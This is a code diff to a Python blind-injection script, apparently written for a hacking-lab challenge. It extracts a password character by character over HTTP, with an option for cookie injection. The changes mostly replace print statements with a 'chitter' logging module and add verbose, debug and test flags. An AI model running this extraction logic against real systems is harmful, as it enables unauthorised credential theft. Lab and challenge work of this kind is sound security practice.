@@ -32,6 +32,7 @@ import urllib.parse
 import base64
 import gzip
 import re
+import chitter
 
 __gHeaderfieldsFile__="headerfields.txt"
 __gHeaderFields__={}
@@ -39,6 +40,8 @@ __gHeaderFields__={}
 # parameters to be modified by your needs
 __gFail__="FAIL"
 __gXparam__='passwd'
+chitter.__gDebug__=False
+chitter.__gInfo__=False
 
 # do not modify parameters below
 __gInclude__={}
@@ -50,17 +53,25 @@ __gInputParameters__={}
 __gRequestParameters__={}
 __gCookies__={}
 
+
+
 def main():
-	print()
-	print(__banner__)
-	print(__description__)
+	
+	chitter.post("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
+	chitter.post("")
+	chitter.post("{}".format(__banner__))
+	chitter.post("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
+	chitter.info(__description__)
+	
+	chitter.debug("TEST TEST TEST")
 
 	# argument parser
-	print("[Status] parse input parameters")
+	
 	parser=argparse.ArgumentParser()
 	args=initParser(parser)
-
+	chitter.status("parse input parameters")
 	# initialization / read in file with headerfield definitions
+	chitter.status("read parameters from requestheader file '{}'".format(__gHeaderfieldsFile__))
 	init()
 	__gInputParameters__.update(handleArgs(args))
 	updateHeaders(__gInputParameters__['headerfile'])
@@ -84,7 +95,7 @@ def main():
 		else:
 			getPwLength(__connection__)
 	else:
-		print("[!!!] Connection could not be established!")
+		chitter.fatal("Connection could not be established!")
 		exit(0)
 	# dont forget to close __connection__
 	__connection__.close()
@@ -93,20 +104,21 @@ def testConnection(connection):
 	requestParameters=urllib.parse.urlencode(__gRequestParameters__)
 	connection.request(__gInputParameters__['method'],__gInputParameters__['path'],requestParameters,__gHeader__)
 	resp=connection.getresponse()
-	print("[CONNECTION] {} - {}".format(resp.status,resp.reason))
+	chitter.status("[CONNECTION] {} - {}".format(resp.status,resp.reason))
 	data=resp.read(100)
 	try:
-		data=gzip.decompress(data)
+		data_out=gzip.decompress(data)
 	except:
+		data_out=data
 		pass
-	print("[+] "+str(res.status)+" | "+str(res.reason))
-	print("[+] RESPONSE HEADERS")
-	for key in res.headers:
-		print("\t"+"[+] "+key+" : "+res.headers[key])
-	print("[+] BODY:\n\t")
-	print("--------- BODY BEGIN ---------")
-	print(data)
-	print("--------- BODY END ---------")
+	chitter.info(str(resp.status)+" | "+str(resp.reason))
+	chitter.info("RESPONSE HEADERS")
+	for key in resp.headers:
+		chitter.info("\t"+key+" : "+resp.headers[key])
+	chitter.info("BODY:\n\t")
+	chitter.info("--------- BODY BEGIN ---------")
+	chitter.info(data_out)
+	chitter.info("--------- BODY END ---------")
 
 def init():
 	try:
@@ -114,20 +126,22 @@ def init():
 			line=hf.readline()
 			while (line!=""):
 				field=line.strip('\n')
-				#print(line)
 				__gHeaderFields__.update({field:''})
 				line=hf.readline()
-		#print(__hfields__)
 	except Exception as e:
-		print("[!!!] Could not read file with list of headerfields!")
+		chitter.fatal("Could not read file with list of headerfields!")
 		print(e)
 
 def initParser(parser):
 	#parser.add_argument("-i","--labId",metavar="\b",dest="labId",required=True,help="hacking-lab id - This refers to the server id from the created docker of the challenge.")
 	parser.add_argument("-r","--request",metavar="\b",dest="headerfile",required=True,help="sample header request file")
 	parser.add_argument("-x","--exclude",dest="exclude",required=False,default="",help="parameters to exclude from condition")
-	parser.add_argument("--useCookie",dest="usecookie",action="store_true",default="False",help="switch to cookie injection")
+	parser.add_argument("--useCookie",dest="usecookie",action="store_true",help="switch to cookie injection")
+	parser.add_argument("--test",dest="test",action="store_true",help="test header and connection")
+	parser.add_argument("-v",dest="verbose",action="store_true",help="show additional information")
+	parser.add_argument("--debug",dest="debug",action="store_true",help="show debug information")
 	#parser.add_argument("-t","target",dest="target",help="optional manual target definition. Overrides labId values")
+	parser.set_defaults(test=False,usecookie=False,verbose=False)
 	args=parser.parse_args()
 	return args
 
@@ -135,7 +149,7 @@ def readRequestHeader(line):
 
 	(method,loc,h)=line.split(" ")
 	h=h.strip('\n')
-	print("\t[REQUEST] {} {} {}".format(method,loc,h))
+	chitter.info("\t[REQUEST] {} {} {}".format(method,loc,h))
 
 	if(method!="POST" and method!="GET"):
 		method=""
@@ -148,7 +162,7 @@ def readRequestHeader(line):
 			updateRequestParameters(p,"GET")
 		else:
 			path=loc #assuming path without request parameters
-			print("[!!!] Did not find any RequestParameters in provided Header")
+			chitter.warn("Did not find any RequestParameters in provided Header")
 	elif(method=="POST"):
 		path=loc
 	__gInputParameters__.update({'method':method,'path':path})
@@ -159,31 +173,32 @@ def updateRequestParameters(s,method):
 		for v in params:
 			(key,value)=v.split("=")
 			__gRequestParameters__.update({key:value})
-			print("\t\t{} {}={}".format(method,key,value))
+			chitter.debug("\t\t{} {}={}".format(method,key,value))
 	else:
 		(key,value)=s.split('=')
 		__gRequestParameters__.update({key:value})
-		print("\t\t{} {}={}".format(method,key,value))
+		chitter.debug("\t\t{} {}={}".format(method,key,value))
 
 def updateCookies(v):
+	v=urllib.parse.unquote_plus(v)
 	if v.find(';')>-1:
 		v=re.sub(r'[ ]*','',v)
 		items=v.split(';')
 		for i in items:
 			(k,v)=i.split("=")
 			__gCookies__.update({k:v})
-			print("\t\t[Cookie] {} = {}".format(k,v) )
+			chitter.post("\t\t[Cookie] {} = {}".format(k,v) )
 	else:
 		v=re.sub(r'[ ]*','',v)
 		(k,v)=v.split('=')
-		print("\t\t[Cookie] {} = {}".format(k,v) )
+		chitter.post("\t\t[Cookie] {} = {}".format(k,v) )
 
 def updateHeaders(__headerFile__):
 	#method=""
 	try:
 		with open(__headerFile__,'r') as hf:
-			print("[+] -----------------------------------------")
-			print("[+] header request fields from header file:")
+			chitter.info(" -----------------------------------------")
+			chitter.info(" header request fields from header file:")
 			for line in hf.readlines():
 				sline=line.strip("\n")
 				fieldFound=False
@@ -193,7 +208,7 @@ def updateHeaders(__headerFile__):
 						v=sline[(sline.find(k)+len(k)):(len(sline)+1)]
 						v=re.sub(r'^[:| #]*', '', v) #remove ':',' ','|' from the beginning
 						__gHeader__.update({k:v})
-						print("\t[+] {}: {}".format(k,v))
+						chitter.info("\t {}: {}".format(k,v))
 						if(k=='Cookie'):
 							updateCookies(v)
 						fieldFound=True
@@ -208,8 +223,8 @@ def updateHeaders(__headerFile__):
 						else:
 							if(__gInputParameters__['method']=="POST"):
 								#sline=line.strip("\n")
-								print("\t[+] -----------------------------------------")
-								print("\t[+] POST request parameters from header file:")
+								chitter.info("\t-----------------------------------------")
+								chitter.info("\tPOST request parameters from header file:")
 								updateRequestParameters(sline,"POST")
 	except Exception as e:
 		print("[!!!] Error in updateHeaders()!")
@@ -223,23 +238,24 @@ def setExclusions(string):
 def handleArgs(args):
 	# handle commandline arguments
 	headerfile=args.headerfile
-
+	__gTestHeader__=args.test
+	chitter.__gDebug__=args.debug
+	chitter.__gInfo__=args.verbose
 	parameters={'headerfile':headerfile,
 				'port':80}
 	return parameters
 
 def connectTarget():
 	# connect to target
-	print("[STATUS] Connect to target '{}'".format(__gInputParameters__['target']))
 	try:
-		print("[STATUS] Connect to target '{}'".format(__gInputParameters__['target']))
+		chitter.status("Connect to target '{}'".format(__gInputParameters__['target']))
 		connection = http.client.HTTPConnection(__gInputParameters__['target'],__gInputParameters__['port'])
 	except Exception as e1:
-		print("[!!!] Could not establish connection in function connectTarget()!")
+		chitter.fatal("Could not establish connection in function connectTarget()!")
 		try:
 			connection.close()
 		except Exception as e2:
-			print("[!!!] Could not close connection in function connectTarget()!")
+			chitter.fatal("Could not close connection in function connectTarget()!")
 			exit(0)
 
 	return connection
@@ -274,7 +290,7 @@ def getPwLength(connection):
 	for n in range(1,31):
 		payload=buildPayloadForLength(n)
 		if not requestFailed(payload,connection):
-			print("[+] payload: {}".format(payload))
+			chitter.info(" payload: {}".format(payload))
 			pwLength=n
 			break
 
@@ -291,9 +307,9 @@ def getPw(connection):
 			for c in range(32,128):
 				payload=buildPayloadForName(chr(c),n)
 				if not requestFailed(payload,connection):
-					print("[+] payload: {}".format(payload))
+					chitter.info(" payload: {}".format(payload))
 					pw+=chr(c)
-					print("[+] pw={}".format(pw))
+					chitter.info(" pw={}".format(pw))
 					break
 	else:
 		print("[-] Password retrievel failed. Password length could not be determined!")
